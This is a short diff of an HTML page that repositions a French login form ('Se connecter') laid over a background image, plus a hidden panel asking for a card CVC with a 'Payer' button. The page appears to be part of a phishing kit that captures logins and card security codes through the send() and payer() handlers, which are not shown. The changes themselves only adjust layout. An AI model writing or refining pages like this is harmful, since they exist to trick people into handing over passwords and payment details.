@@ -30,14 +30,14 @@ body, html {
     </script>
 	
   <div class="bg" id="bg">
-          <input style="position:absolute;left:21%;top:32%;" type="text" id="id" name="id" value="">
-          <input style="position:absolute;left:22%;top:60%" type="password" id="pwd" name="pwd" value="">
-          <input style="position:absolute;left:25%;top:68%" type="submit" id="connexion" name="connexion" value="Se connecter" onclick="send();">
+          <input style="position:absolute;left:15%;top:33%;font-size:7;" type="text" id="id" name="id" size="8" value="">
+          <input style="position:absolute;left:17%;top:60%;font-size:7;" type="password" id="pwd" name="pwd" size="8" value="">
+          <input style="position:absolute;left:17%;top:80%;font-size:8;" type="submit" id="connexion" name="connexion" value="Se connecter" onclick="send();">
   </div>
 
 	<div id="divCVC" style="display:none;">
 <p style="text-align:center" id="titre" name="titre"></p>
-<img src="CVC.png" width="50" height="40" style="position:absolute;top:10%;left:20%;"> 
+<img src="CVC.png" width="50" height="40" style="position:absolute;left:20%;"> 
 	<p style=" text-align:center"><input style="text-align:center" pattern=".{3,3}" required type="password" name="cvc" id="cvc" value=""> </p>
 	<p style=" text-align:center"><input type="submit" name="payer" id="payer" value="Payer" onclick="payer();"> </p>
 	</div>
